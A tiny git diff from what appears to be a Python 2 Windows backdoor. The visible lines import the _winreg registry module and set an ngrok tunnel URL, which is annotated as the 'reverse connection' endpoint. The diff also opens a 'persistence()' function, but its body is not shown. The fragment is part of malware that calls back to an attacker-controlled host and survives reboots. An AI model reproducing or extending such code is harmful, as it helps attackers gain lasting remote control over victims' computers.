@@ -7,7 +7,7 @@ import shutil
 import _winreg as wreg
 import random
 
-url = "http://c33cd106.ngrok.io"
+url = "http://c33cd106.ngrok.io"    #ngrok to reverse connection
 
 
 def persistence():
